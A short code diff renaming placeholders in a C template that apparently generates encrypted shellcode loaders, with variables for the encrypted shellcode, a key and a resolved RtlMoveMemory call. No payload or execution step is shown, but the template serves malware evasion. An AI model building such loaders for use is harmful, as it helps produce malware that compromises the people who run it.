@@ -6,9 +6,9 @@ typedef VOID (WINAPI* $RtlMoveMemoryDec$)(VOID UNALIGNED* Destination,const VOID
 
 int main(void) {
 	DWORD oldprotect = 0;
-	char $EncryptedShellcodeVar$[] = $SHELLCODE$;
+	char $EncryptedShellcodeVar$[] = $Payload$;
 	
-	char key[] = "$KEY$";
+	char key[] = "$Key$";
 
 	char $ShellcodeVar$[sizeof $EncryptedShellcodeVar$];
 
